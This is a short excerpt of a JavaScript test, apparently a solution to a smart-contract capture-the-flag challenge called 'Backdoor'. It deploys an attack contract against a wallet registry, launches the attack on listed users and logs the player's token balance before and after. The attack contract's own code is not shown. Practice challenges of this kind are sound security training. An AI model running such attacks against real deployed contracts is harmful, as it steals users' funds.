...
describe('[Challenge] Backdoor', function () {
    ...
    it('Execution', async function () {
        ...
        console.log("Player DVT balance BEFORE: ", await token.balanceOf(player.address));
        attacker = await (await ethers.getContractFactory('GnosisSafeFactoryAttack', deployer)).deploy(walletRegistry.address);
        await attacker.connect(player).launchAttack(users);
        console.log("Player DVT balance AFTER: ", await token.balanceOf(player.address));
    });
